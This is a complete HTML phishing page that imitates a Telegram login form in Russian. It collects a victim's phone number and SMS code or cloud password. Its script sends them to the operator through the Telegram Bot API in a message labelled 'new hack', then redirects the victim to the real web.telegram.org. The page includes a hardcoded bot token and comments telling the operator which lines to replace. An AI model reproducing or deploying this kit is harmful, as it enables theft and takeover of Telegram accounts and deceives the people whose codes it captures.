<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Secure Login</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; padding-top: 100px; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 320px; }
        h3 { text-align: center; margin-top: 0; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
        button:hover { background: #006699; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Введите данные для входа</h3>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Номер телефона (в формате +7...)" required>
            <input type="text" id="code" placeholder="Код из SMS / облачный пароль" required>
            <button type="submit">Продолжить</button>
        </form>
    </div>
    <script>
        // ====== ЗАМЕНИ ЭТИ ДВЕ СТРОКИ ======
        const BOT_TOKEN = "8632513404:AAGN-mNBpoQ5kUZWhzKwHpl_zfN7hWQz8Js";   // например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
        const CHAT_ID = "8632513404:AAGN-mNBpoQ5kUZWhzKwHpl_zfN7hWQz8Js";                // например: "123456789" (только цифры)
        // =====================================

        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const code = document.getElementById('code').value.trim();
            if (!phone || !code) {
                alert('Заполни оба поля!');
                return;
            }
            const msg = `Новый взлом:\nТелефон: ${phone}\nКод: ${code}`;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                });
                alert('Проверка пройдена. Перенаправление...');
                window.location.href = 'https://web.telegram.org';
            } catch (err) {
                alert('Ошибка отправки, но данные сохранены локально. Проверь токен и интернет.');
            }
        };
    </script>
</body>
</html>
